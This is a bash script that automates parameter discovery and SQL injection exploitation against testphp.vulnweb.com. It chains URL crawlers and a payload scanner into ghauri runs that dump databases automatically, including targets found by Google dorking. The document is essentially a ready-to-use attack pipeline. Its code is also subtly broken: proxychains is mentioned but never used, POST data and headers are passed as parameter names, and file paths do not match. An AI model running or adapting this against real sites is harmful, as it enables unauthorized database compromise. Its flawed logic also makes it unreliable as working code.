
# Step 1: Generate URLs using paramspider
paramspider -d testphp.vulnweb.com -o urls.txt

# Step 2: Clean the URLs
cat output/urls.txt | sed 's/FUZZ//g' > final.txt

# Step 3: Run lostsec.py with the cleaned URLs and payloads
python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5

# Step 4: Generate URLs with gau
echo testphp.vulnweb.com | gau --mc 200 | urldedupe > urls.txt

# Step 5: Filter and sort the URLs
cat urls.txt | grep -E ".php|.asp|.aspx|.cfm|.jsp" | grep '=' | sort > output.txt

# Step 6: Clean the URLs
cat output.txt | sed 's/=.*/=/' > final.txt

# Step 7: Run lostsec.py again
python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5

# Step 8: Generate URLs with katana
echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe > output.txt

# Step 9: Generate more URLs with katana
katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt

# Step 10: Clean the URLs
cat output.txt | sed 's/=.*/=/' > final.txt

# Step 11: Run lostsec.py one more time
python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5

# Function to test URLs with Ghauri using proxychains
test_with_ghauri() {
  url="$1"
  param="$2"
  
  echo "Testing $url with Ghauri through proxychains"
  ghauri -u "$url" -p "$param" --batch --dbs --confirm --level 3 --time-sec 10
}

# Step 12: Integrate Ghauri to test for SQLi and auto exploit
while IFS= read -r url; do
  echo "Testing $url with Ghauri"
  
  # Extract parameter name from URL
  param=$(echo "$url" | grep -o '=[^&]*' | sed 's/=.*//')

  # Run Ghauri to test for SQL injection using proxychains
  test_with_ghauri "$url" "$param"
  
  # Integrate POST method
  # You need to specify the POST data if known, otherwise use default test parameter
  post_data="id=1"
  test_with_ghauri "$url" "$post_data"
  
  # Integrate Header-based SQLi
  test_with_ghauri "$url" "X-Forwarded-For: 127.0.0.1"
  
done < final.txt

# Step 13: Integrate Google Dorking with Ghauri for auto exploit
# This part requires Google search and parsing the results
# Make sure you comply with Google's terms of service and usage policies
search_query="site:testphp.vulnweb.com inurl:php?id="
google_search_results=$(google_search "$search_query")

# Assuming google_search_results is a file or a variable containing the URLs
while IFS= read -r url; do
  echo "Testing $url from Google Dorks with Ghauri"
  
  # Extract parameter name from URL
  param=$(echo "$url" | grep -o '=[^&]*' | sed 's/=.*//')
  
  # Run Ghauri to test for SQL injection using proxychains
  test_with_ghauri "$url" "$param"
  
done < google_search_results

